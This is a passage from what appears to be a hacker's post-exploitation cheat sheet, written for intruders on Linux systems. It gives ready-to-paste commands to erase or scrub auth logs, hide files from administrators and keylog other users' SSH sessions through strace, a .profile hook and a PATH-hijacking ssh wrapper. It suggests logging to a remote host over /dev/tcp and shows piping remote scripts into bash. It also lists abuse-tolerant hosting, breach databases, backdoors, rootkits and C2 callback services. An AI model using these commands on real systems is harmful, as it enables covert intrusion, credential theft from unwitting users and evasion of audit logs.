This will reset the logfile to 0 without having to restart syslogd etc:
```sh
cat /dev/null >/var/log/auth.log
```

This will remove any sign of us from the log file:
```sh
cd /dev/shm
grep -Fv 'thc.org' /var/log/auth.log >a.log; cat a.log >/var/log/auth.log; rm -f a.log
```

<a id="shell-hide-files"></a>
**7.iv. Hide files from that User without root privileges**

Our favorite working directory is */dev/shm/*. This location is volatile memory and will be lost on reboot. NO LOGZ == NO CRIME.

Hiding permanent files:

Method 1:
```sh
alias ls='ls -I system-dev'
```

This will hide the directory *system-dev* from the *ls* command. Place in User's *~/.profile* or system wide */etc/profile*.

Method 2:
Tricks from the 80s. Consider any directory that the admin rarely looks into (like */boot/.X11/..* or so):
```sh
mkdir '...'
cd '...'
```

Method 3:
Unix allows filenames with about any ASCII character but 0x00. Try tab (*\t*). Happens that most Admins do not know how to cd into any such directory.
```sh
mkdir $'\t'
cd $'\t'
```

<a id="linux-info"></a>
**7.v. Find out Linux Distro**

```sh
# Find out Linux Distribution
uname -a; lsb_release -a; cat /etc/*release /etc/issue* /proc/version
```

---
<a id="crypto"></a>
## 8. Crypto
<a id="gen-password"></a>
**8.i. Generate quick random Password**

Good for quick passwords without human element.

```sh
openssl rand -base64 24
```

If `openssl` is not available then we can also use `head` to read from `/dev/urandom`.

```sh
head -c 32 < /dev/urandom | xxd -p -c 32
```

or make it alpha-numeric

```sh
head -c 32 < /dev/urandom | base64 | tr -dc '[:alnum:]' | head -c 16
```

<a id="crypto-filesystem"></a>
**8.ii.a. Linux transportable encrypted filesystems - cryptsetup**

Create a 256MB large encrypted file system. You will be prompted for a password.

```sh
dd if=/dev/urandom of=/tmp/crypted bs=1M count=256 iflag=fullblock
cryptsetup luksFormat /tmp/crypted
mkfs.ext3 /tmp/crypted
```

Mount:

```sh
losetup -f
losetup /dev/loop0 /tmp/crypted
cryptsetup open /dev/loop0 crypted
mount -t ext3 /dev/mapper/crypted /mnt/crypted
```

Store data in `/mnt/crypted`, then unmount:

```sh
umount /mnt/crypted
cryptsetup close crypted
losetup -d /dev/loop0
```
<a id="encfs"></a>
**8.ii.b. Linux transportable encrypted filesystems - EncFS**

Create ```.sec``` and store the encrypted data in ```.raw```:
```sh
mkdir .raw .sec
encfs --standard  "${PWD}/.raw" "${PWD}/.sec"
```

unmount:
```sh
fusermount -u .sec
```

<a id="encrypting-file"></a>
**8.iii Encrypting a file**

Encrypt your 0-Days and log files before transfering them - please. (and pick your own password):

```sh
# Encrypt
openssl enc -aes-256-cbc -pbkdf2 -k fOUGsg1BJdXPt0CY4I <input.txt >input.txt.enc
```

```sh
# Decrypt
openssl enc -d -aes-256-cbc -pbkdf2 -k fOUGsg1BJdXPt0CY4I <input.txt.enc >input.txt
```

---
<a id="ssh-sniffing"></a>
## 9. SSH Sniffing
<a id="ssh-sniffing-strace"></a>
**9.i Sniff a user's SSH session with strace**
```sh
strace -e trace=read -p <PID> 2>&1 | while read x; do echo "$x" | grep '^read.*= [1-9]$' | cut -f2 -d\"; done
```
Dirty way to monitor a user who is using *ssh* to connect to another host from a computer that you control.

<a id="ssh-sniffing-script"></a>
**9.ii Sniff a user's SSH session with script**

The tool 'script' has been part of Unix for decades. Add 'script' to the user's .profile. The user's keystrokes and session will be recorded to ~/.ssh-log.txt the next time the user logs in:
```sh
echo 'exec script -qc /bin/bash ~/.ssh-log.txt' >>~/.profile
```
Consider using [zap-args](#bash-hide-arguments) to hide the the arguments and /dev/tcp/3.13.3.7/1524 as an output file to log to a remote host.

<a id="ssh-sniffing-wrapper"></a>
**9.iii. Sniff a user's SSH session with a wrapper script**

Even dirtier way in case */proc/sys/kernel/yama/ptrace_scope* is set to 1 (strace will fail on already running SSH clients unless uid=0)

Create a wrapper script called 'ssh' that executes strace + ssh to log the session:
```sh
# Cut & Paste the following into a bash shell:
# Add a local path to the PATH variable so our 'ssh' is executed instead of the real ssh:
echo 'PATH=~/.local/bin:$PATH #0xFD0E' >>~/.profile

# Create a log directory and our own ssh binary
mkdir -p ~/.local/bin ~/.local/logs

cat <<__EOF__ >~/.local/bin/ssh
#! /bin/bash
strace -e trace=read -I 1 -o '! ~/.local/bin/ssh-log \$\$' /usr/bin/ssh \$@
__EOF__

cat <<__EOF__ >~/.local/bin/ssh-log
#! /bin/bash
grep -F 'read(4' | cut -f2 -d\\" | while read -r x; do
        [[ \${#x} -gt 5 ]] && continue 
        [[ \${x} == +(\\\\n|\\\\r) ]] && { echo ""; continue; }
        echo -n "\${x}"
done >\$HOME/.local/logs/ssh-log-"\${1}"-\`date +%s\`.txt
__EOF__

chmod 755 ~/.local/bin/ssh ~/.local/bin/ssh-log
. ~/.profile

echo -e "\033[1;32m***SUCCESS***.
Logfiles stored in ~/.local/.logs/.
To uninstall cut & paste this\033[0m:\033[1;36m
  grep -v 0xFD0E ~/.profile >~/.profile-new && mv ~/.profile-new ~/.profile
  rm -rf ~/.local/bin/ssh ~/.local/bin/ssh-log ~/.local/logs/ssh-log*.txt
  rmdir ~/.local/bin ~/.local/logs ~/.local &>/dev/null \033[0m"
```
(thanks to Gerald for testing this)

The SSH session will be sniffed and logged to *~/.ssh/logs/* the next time the user logs into his shell and uses SSH.

<a id="ssh-sniffing-sshit"></a>
**9.iv Sniff a user's SSH session using SSH-IT**

The easiest way is using [https://www.thc.org/ssh-it/](https://www.thc.org/ssh-it/).

```sh
bash -c "$(curl -fsSL ssh-it.thc.org/x)"
```

---
<a id="vpn-shell"></a>
## 10. VPN & Shells
<a id="shell"></a>
**10.i. Disposable Root Servers**

```console
$ ssh root@segfault.net # Use password 'segfault'
```

https://thc.org/segfault

<a id="vpn"></a>
**10.ii. VPN/VPS/Proxies**

Trusted VPN Providers
1. https://www.mullvad.net
1. https://www.cryptostorm.is

Virtual Private Servers
1. https://www.hetzner.com - Cheap
1. https://dmzhost.co - Ignore most abuse requests
1. https://buyvm.net - Warez best friend
1. https://serverius.net - Used by gangsters
1. https://1984.hosting - Privacy
1. https://bithost.io - Reseller for DigitalOcean, Linode, Hetzner and Vultr (accepts Crypto)
1. https://www.privatelayer.com - Swiss based.

Proxies (we dont use any of those)
1. [proxyscrape.com](https://api.proxyscrape.com/v2/?request=displayproxies&protocol=all&timeout=750&country=all)
1. [my-proxy.com](https://www.my-proxy.com)
1. [getfreeproxylists.blogspot.com](https://getfreeproxylists.blogspot.com/)
1. [proxypedia.org](https://proxypedia.org/)
1. [socks-proxy.net](https://socks-proxy.net/)

Many other services (for free)  
1. https://free-for.dev/

---
<a id="osint"></a>
## 11. Intelligence Gathering

| OSINT Hacker Tools ||
| --- | --- |
| https://osint.sh | Free. Subdomain Finder, DNS History, Public S3 Buckets, Reverse IP, Certificate Search and much more |
| https://cli.fyi | Free. curl/json interface to many services. Try `curl cli.fyi/me` or `curl cli.fyi/thc.org`. |
| https://hackertarget.com/ip-tools/ | Free OSINT Service (Reverse IP, MTR, port scan, CMS scans, Vulnerability Scans, API support) |
| https://account.shodan.io/billing/tour | Open Port DB & DNS Lookup from around the world |
| https://dnsdumpster.com/ | Domain Recon Tool |
| https://crt.sh/ | TLS Certificate Search |
| https://archive.org/web/ | Historical view of websites |
| https://www.farsightsecurity.com/solutions/dnsdb/ | DNS search (not free) |
| https://wigle.net/ | Wireless Network Mapper |
| https://radiocells.org/ | Cell Tower Informations |
| https://www.shodan.io/ | Search Engine to find devices & Banners (not free) |

| OSINT for Detectives ||
| --- | --- |
| https://start.me/p/rx6Qj8/nixintel-s-osint-resource-list | Nixintel's OSINT Resource List |
| https://github.com/jivoi/awesome-osint | Awesome OSINT list |
| https://cipher387.github.io/osint_stuff_tool_collection/ | OSINT tools collection |
| https://osintframework.com/ | Many OSINT tools |

| OSINT Databases ||
| --- | --- |
| http://breached65xqh64s7xbkvqgg7bmj4nj7656hcb7x4g42x753r7zmejqd.onion/ | Live Data Breach information |
| https://data.ddosecrets.com/ | Database Dumps

---
<a id="misc"></a>
## 12. Miscellaneous
<a id="tools"></a>
**12.i. Tools of the trade**

Comms
1. https://www.cs.email/ - Disposable emails (List of [Disposable-email-services](https://github.com/AnarchoTechNYC/meta/wiki/Disposable-email-services])).
1. https://temp-mail.org/en/ - Disposable email service with great Web GUI.
1. https://quackr.io - Disposable SMS/text messages (List of [Disposable-SMS-services](https://github.com/AnarchoTechNYC/meta/wiki/Disposable-SMS-services)).

Exploits
1. https://github.com/liamg/traitor - Tries various exploits/vulnerabilities to gain root (LPE)
1. https://packetstormsecurity.com/ - Our favorite site ever since we shared a Pizza with fringe[at]dtmf.org in NYC in 2000
1. https://www.exploit-db.com/ - Also includes metasploit db and google hacking db
1. https://exploits.shodan.io/welcome - Similar to exploit-db

System Information Gathering
1. https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS - Quick system informations for hackers.
1. https://github.com/zMarch/Orc - Post-exploit tool to find local RCE (type `getexploit` after install)

Backdoors
1. https://www.gsocket.io/deploy - The world's smallest backdoor
1. https://github.com/m0nad/Diamorphine - Linux Kernel Module for hiding processes and files
1. https://www.kali.org/tools/weevely - PHP backdoor 

Scanners
1. https://github.com/robertdavidgraham/masscan - Scan the entire Internet
1. https://github.com/ptrrkssn/pnscan - Fast network scanner
1. https://zmap.io/ - ZMap & ZGrab
1. https://github.com/fullhunt/ - log4j and spring4shell scanner 

Tools
1. https://github.com/guitmz/ezuri - Obfuscate Linux binaries
1. https://tmate.io/ - Share A screen with others

Callback / Command And Control
1. http://dnslog.cn
1. http://interact.sh
1. https://api.telegram.org

Tunneling
1. [TCP Gender Changer](https://tgcd.sourceforge.net/) for all your 'connect back' needs.
1. [ngrok](https://ngrok.com/download), [cloudflared](https://developers.cloudflare.com/cloudflare-one/connections/connect-apps) or [pagekite](https://pagekite.net/) to make a server behind NAT accessible from the public Internet.

Publishing
1. [free BT/DC/eD2k seedbox](https://valdikss.org.ru/schare/)
1. Or use /onion on [segfault.net](https://www.thc.org/segfault) or plain old https with ngrok.

Mindmaps & Knowledge
1. [Active Directory](https://orange-cyberdefense.github.io/ocd-mindmaps/img/pentest_ad_dark_2022_11.svg)
1. [Z Library](https://singlelogin.me)/[Z Library on TOR](http://bookszlibb74ugqojhzhg2a63w5i2atv5bqarulgczawnbmsb6s6qead.onion/)

<a id="cool-linux-commands"></a>
**12.ii. Cool Linux commands**

1. https://jvns.ca/blog/2022/04/12/a-list-of-new-ish--command-line-tools/
1. https://github.com/ibraheemdev/modern-unix

<a id="tmux"></a>
**12.iii. tmux**

| | Tmux Cheat Sheet |
| --- | --- |
| Save Scrollback | ```Ctrl+b``` + ```:```, then type ```capture-pane -S -``` followed by ```Ctrl+b``` + ```:``` and type ```save-buffer filename.txt```. |
| Attach | Start a new tmux, then type ```Ctrl+b``` + ```s``` and use ```LEFT```, ```RIGHT``` to expand and select any session. |
| Logging | ```Ctrl+b``` + ```Shift + P``` to start and stop. |
| Menu | ```Ctrl+b``` + ```>```. Then use ```Ctrl+b``` + ```UP```, ```DOWN```, ```LEFT``` or ```RIGHT``` to move between the panes. |

<a id="useful-commands"></a>
**12.iv. Useful commands**

Use ```lsof -Pni``` or ```netstat -antpu``` (or ```ss -antpu```) to list all Internet (_-tu_) connections.

Use ```ss -lntp``` to show all listening (_-l_) TCP (_-t_) sockets.

Use ```netstat -rn``` or ```ip route show``` to show default Internet route.

Use ```curl cheat.sh/tar``` to get TLDR help for tar. Works with any other linux command.

Use ```curl -fsSL bench.sh | bash``` to speed test a server.

Hacking over long latency links or slow links can be frustrating. Every keystroke is transmitted one by one and any typo becomes so much more frustrating and time consuming to undo. *rlwrap* comes to the rescue. It buffers all single keystrokes until *Enter* is hit and then transmits the entire line at once. This makes it so much easier to type at high speed, correct typos, ...

Example for the receiving end of a revese tunnel:
```sh
rlwrap --always-readline nc -vnlp 1524
```

Example for *SSH*:
```sh
rlwrap --always-readline ssh user@host
```
---
<a id="others"></a>
## 13. Other Sites

1. [Hacking HackingTeam - a HackBack](https://gist.github.com/jaredsburrows/9e121d2e5f1147ab12a696cf548b90b0) - Old but real talent at work.
1. [Conti Leak](https://github.com/ForbiddenProgrammer/conti-pentester-guide-leak) - Windows hacking. Pragmatic.
1. https://book.hacktricks.xyz/welcome/readme
1. https://github.com/yeyintminthuhtut/Awesome-Red-Teaming


---
Shoutz: ADM, subz/#9x, DrWho, spoty
Join us on [Telegram](https://t.me/thcorg).

